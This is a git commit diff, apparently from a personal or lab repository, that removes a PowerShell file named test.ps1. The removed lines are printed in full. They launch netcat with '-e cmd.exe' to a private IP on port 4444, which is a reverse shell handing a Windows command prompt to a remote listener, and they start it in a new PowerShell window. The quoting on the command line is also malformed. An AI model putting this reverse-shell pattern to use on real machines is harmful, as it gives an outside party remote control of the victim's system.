7d3524c80fdc5c3aea01be80cdd65cbb13f730fe
DougSoares1 <93358274+DougSoares1@users.noreply.github.com>
2024-11-04 19:37:00 -0300

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,12 +1,1 @@
-# Defina o caminho completo para a pasta onde o netcat está localizado
-$netcatPath = "C:\Users\dougl\netcat-1.11"
 
-# Defina o IP e a porta que deseja usar
-$ip = "192.168.150.135"
-$port = 4444
-
-# Comando para executar o netcat
-$ncCommand = ".\nc.exe $ip $port" -e cmd.exe
-
-# Abre uma nova instância do PowerShell, navega para o diretório e executa o comando
-Start-Process powershell -ArgumentList "-NoExit", "-Command", "cd `"$netcatPath`"; $ncCommand"
